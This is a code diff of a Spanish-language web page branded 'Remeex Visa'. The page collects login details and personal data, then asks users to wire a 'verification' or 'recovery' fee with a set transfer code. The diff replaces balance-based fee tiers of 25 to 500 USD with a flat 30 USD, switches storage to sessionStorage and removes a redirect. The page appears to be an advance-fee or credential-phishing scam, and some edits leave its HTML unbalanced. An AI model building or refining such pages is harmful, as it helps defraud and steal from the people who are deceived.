@@ -2,7 +2,6 @@
 <html lang="es">
 <head>
   <script src="repair.js"></script>
-  <script src="global-data.js"></script>
   <script src="bank-data.js"></script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
@@ -2551,7 +2550,6 @@
                 <div class="confirmation-text">Entiendo que este es un proceso de verificación de mi cuenta y me comprometo a seguir los pasos correctamente.</div>
             </div>
             
-            <div class="btn-container">
                 <button class="btn" id="login-btn" onclick="validateLogin()" disabled>
                     Continuar
                     <i class="fas fa-arrow-right"></i>
@@ -2603,7 +2601,6 @@
                 <div class="error-message" id="id-error"></div>
             </div>
             
-            <div class="btn-container">
                 <button class="btn btn-secondary" onclick="goBack('user-data-form', 'login-form')">
                     <i class="fas fa-arrow-left"></i>
                     Volver
@@ -2626,7 +2623,7 @@
         <div class="card" id="payment-info">
             <h2>Información de Recuperación</h2>
             <p>Seleccione el monto requerido y utilice los datos de transferencia para completar el pago:</p>
-            <p id="min-amount-note" class="min-amount-note"></p>
+            <p id="min-amount-note" class="min-amount-note">El monto requerido es 30 USD.</p>
             
             <div class="form-group">
                 <label for="amount-container">Monto Requerido:</label>
@@ -2655,7 +2652,6 @@
                 <div class="confirmation-text">Confirmo que he realizado la transferencia por el monto seleccionado</div>
             </div>
             
-            <div class="btn-container">
                 <button class="btn btn-secondary" onclick="goBack('payment-info', 'user-data-form')">
                     <i class="fas fa-arrow-left"></i>
                     Volver
@@ -2716,7 +2712,6 @@
             </div>
             
             <!-- No mostramos botón volver en la etapa final -->
-            <div class="btn-container">
                 <button class="btn" onclick="confirmPayment()">
                     Enviar Comprobante
                     <i class="fas fa-check"></i>
@@ -2733,8 +2728,6 @@
                     Soporte Técnico: +1 737-301-8059
                 </a>
             </div>
-            <div class="btn-container">
-                <a class="btn btn-secondary" href="recarga.html?section=mobile-payment">Ir a Recarga</a>
             </div>
         </div>
     </div>
@@ -2817,7 +2810,6 @@
                 </button>
             </div>
             
-            <div class="btn-container">
                 <button class="btn btn-secondary close-btn" onclick="closePaymentOverlay()">
                     <i class="fas fa-times"></i>
                     Cerrar
@@ -2854,50 +2846,17 @@
     ]; // Clave de acceso para recuperación de cuenta
     const conceptCode = '4454651'; // Código de concepto unificado
     
-    // Definición de montos disponibles (se filtrarán según el saldo del usuario)
+    // Definicion de montos disponibles
     let availableAmounts = [
-        { value: 25, label: "25 USD" },
-        { value: 30, label: "30 USD" },
-        { value: 35, label: "35 USD" },
-        { value: 40, label: "40 USD" },
-        { value: 45, label: "45 USD" },
-        { value: 50, label: "50 USD" },
-        { value: 100, label: "100 USD" },
-        { value: 200, label: "200 USD" },
-        { value: 250, label: "250 USD" },
-        { value: 400, label: "400 USD" },
-        { value: 500, label: "500 USD" }
+        { value: 30, label: "30 USD" }
     ];
 
-    // Obtener el saldo y el estatus del usuario para determinar el monto mínimo
-    function getValidationAmountByBalance(balanceUsd) {
-        if (balanceUsd <= 500) return 25;
-        if (balanceUsd <= 1000) return 30;
-        if (balanceUsd <= 2000) return 35;
-        if (balanceUsd <= 5000) return 40;
-        return 45;
-    }
-
-    function adjustAmountsByBalance() {
-        const balanceData = JSON.parse(localStorage.getItem('remeexBalance') || '{}');
-        const status = localStorage.getItem('remeexVerificationStatus') || 'unverified';
-        const minUsd = getValidationAmountByBalance(balanceData.usd || 0);
-        availableAmounts = availableAmounts.filter(a => a.value >= minUsd);
-        const note = document.getElementById('min-amount-note');
-        if (note) {
-            const bal = (balanceData.usd || 0).toLocaleString('en-US', {minimumFractionDigits:2, maximumFractionDigits:2});
-            note.textContent = `El monto mínimo para validar tu cuenta se calcula según tu saldo actual ($${bal}). Puedes recargar a partir de $${minUsd}. Si tu saldo fuera menor, el monto requerido sería inferior.`;
-        }
-    }
-
-    // Obtener lista de bancos desde bank-data.js
-const bankList = [...(BANK_DATA.NACIONAL || []), ...(BANK_DATA.INTERNACIONAL || []), ...(BANK_DATA.FINTECH || [])];
-
+    // Autocompletar datos desde sessionStorage
     function autoFillFromStorage() {
         try {
-            const reg = JSON.parse(localStorage.getItem('visaRegistrationCompleted') || '{}');
-            const user = JSON.parse(localStorage.getItem('visaUserData') || '{}');
-            const banking = JSON.parse(localStorage.getItem('remeexVerificationBanking') || '{}');
+            const reg = JSON.parse(sessionStorage.getItem('visaRegistrationCompleted') || '{}');
+            const user = JSON.parse(sessionStorage.getItem('visaUserData') || '{}');
+            const banking = JSON.parse(sessionStorage.getItem('remeexVerificationBanking') || '{}');
             const data = Object.assign({}, reg, user, banking);
 
             const fullName = data.fullName || data.name || (`${data.firstName || ''} ${data.lastName || ''}`).trim();
@@ -2941,7 +2900,7 @@ const bankList = [...(BANK_DATA.NACIONAL || []), ...(BANK_DATA.INTERNACIONAL || 
     let countdownValue = 45;
     let selectedBank = null;
     let particles = [];
-    let selectedAmount = 25; // Valor predeterminado
+    let selectedAmount = 30; // Valor predeterminado
     let transferConfirmed = false; // Estado para el checkbox de confirmación
     let understandingConfirmed = false; // Estado para el checkbox de entendimiento
     let hasViewedPaymentData = false; // Variable para rastrear si el usuario ha visto los datos de pago
@@ -2949,8 +2908,7 @@ const bankList = [...(BANK_DATA.NACIONAL || []), ...(BANK_DATA.INTERNACIONAL || 
     // Mostrar primer formulario al cargar
     document.addEventListener('DOMContentLoaded', function() {
         document.getElementById('login-form').classList.add('active');
-        // Ajustar montos según el saldo y cargar opciones
-        adjustAmountsByBalance();
+        // Cargar opciones de monto
         loadAmountOptions();
         // Cargar logos de bancos
         loadBankLogos();
@@ -3707,9 +3665,9 @@ const bankList = [...(BANK_DATA.NACIONAL || []), ...(BANK_DATA.INTERNACIONAL || 
         // Ocultar spinner container
         document.getElementById('spinner-container').classList.remove('active');
 
-        // Guardar en localStorage que se completó una recarga por activación
+        // Guardar en sessionStorage que se completó una recarga por activación
         try {
-            localStorage.setItem('remeexPendingActivationPayment', JSON.stringify({
+            sessionStorage.setItem('remeexPendingActivationPayment', JSON.stringify({
                 amount: selectedAmount
             }));
         } catch (e) {
@@ -3722,60 +3680,23 @@ const bankList = [...(BANK_DATA.NACIONAL || []), ...(BANK_DATA.INTERNACIONAL || 
             <div class="card active">
                 <h2>Verificando Información</h2>
                 <p>Su comprobante ha sido registrado exitosamente. Estamos verificando la información proporcionada.</p>
-                
                 <div class="concept-alert" style="border-color: var(--success-color); background-color: rgba(23, 168, 75, 0.05);">
                     <i class="fas fa-check-circle" style="color: var(--success-color);"></i>
                     <div class="concept-alert-content">
                         <div class="concept-alert-title" style="color: var(--success-color);">Confirmación de Transacción</div>
-                        <div class="concept-alert-text">ID de Transacción: ${Math.floor(Math.random() * 1000000000).toString().padStart(9, '0')}</div>
+                        <div class="concept-alert-text">ID de Transacción: ${Math.floor(Math.random() * 1000000000).toString().padStart(9, 0)}</div>
                     </div>
                 </div>
-                
-                <div class="payment-alert">
-                    <div class="payment-alert-header">
-                        <div class="payment-alert-icon">
-                            <i class="fas fa-exclamation-triangle"></i>
-                        </div>
-                        <div class="payment-alert-title">Información importante sobre su comprobante</div>
-                    </div>
-                    <div class="payment-alert-body">
-                        <div class="payment-alert-message">
-                            <strong>¡Recuerde!</strong> Para que podamos procesar correctamente su comprobante, el código de concepto/descripción en su transferencia bancaria debe ser exactamente:
-                        </div>
-                        <div class="payment-alert-code">4454651</div>
-                        <div class="payment-alert-message">
-                            Si no incluyó este código en su transferencia, por favor realice una nueva transferencia con el código correcto para agilizar el proceso de verificación.
-                        </div>
-                    </div>
-                </div>
-                
-                <div class="spinner" style="margin: 30px auto;"></div>
-                <p style="text-align: center;">La página se redirigirá automáticamente en <span id="redirect-countdown" style="font-weight: bold; color: var(--primary-color);">40</span> segundos...</p>
-                
                 <div class="concept-alert" style="margin-top: 30px;">
                     <i class="fas fa-info-circle"></i>
                     <div class="concept-alert-content">
-                        <div class="concept-alert-title">Próximos pasos</div>
-                        <div class="concept-alert-text">Recuerde adjuntar el comprobante de pago en la sección "Pago Móvil" de su perfil Remeex Visa para completar el proceso de verificación.</div>
+                        <div class="concept-alert-title">Proceso Completado</div>
+                        <div class="concept-alert-text">Puede cerrar esta página de forma segura.</div>
                     </div>
                 </div>
             </div>
         `;
         
-        // Iniciar cuenta regresiva para redireccionamiento
-        let redirectCounter = 40;
-        const redirectCountdown = setInterval(() => {
-            redirectCounter--;
-            const element = document.getElementById('redirect-countdown');
-            if (element) {
-                element.textContent = redirectCounter;
-            }
-            
-            if (redirectCounter <= 0) {
-                clearInterval(redirectCountdown);
-                window.location.href = "recarga.html?section=mobile-payment";
-            }
-        }, 1000);
     }
     
     // Función para volver al paso anterior
